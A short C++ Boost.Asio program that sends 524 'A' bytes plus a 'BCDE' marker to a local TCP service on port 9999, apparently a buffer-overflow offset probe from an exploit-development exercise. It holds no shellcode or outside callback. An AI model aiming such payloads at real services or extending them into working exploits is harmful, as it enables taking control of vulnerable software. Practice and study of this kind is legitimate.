#include <iostream>
#include <boost/asio.hpp>
#include "../helper.cpp"

using namespace std;
using namespace boost;
using namespace NAM;


string payload = createstr('A',524);

#define errormayhappen                                \
    if (ec.value())                                   \
    {                                                 \
        cout << "\nError : " << ec.message() << "\n"; \
        return ec.value();                            \
    }

int main()
{
    payload += "BCDE";
    asio::io_service ioservice;
    system::error_code ec;
    int port = 9999;
    string ip = "127.0.0.1";
    asio::ip::tcp::endpoint sep(asio::ip::address::from_string(ip, ec), port);
    errormayhappen;
    //asio::ip::tcp::endpoint cep(asio::ip::address_v4::any(), 8888);
    //errormayhappen;

    asio::ip::tcp::socket client(ioservice);
    //client.bind(cep, ec);
    //errormayhappen;
    client.open(asio::ip::tcp::v4(), ec);
    errormayhappen;
    client.connect(sep, ec);
    errormayhappen;

    client.write_some(asio::buffer(payload.data(), payload.size()), ec);
    errormayhappen;

    client.close(ec);
    errormayhappen;
    return 0;
}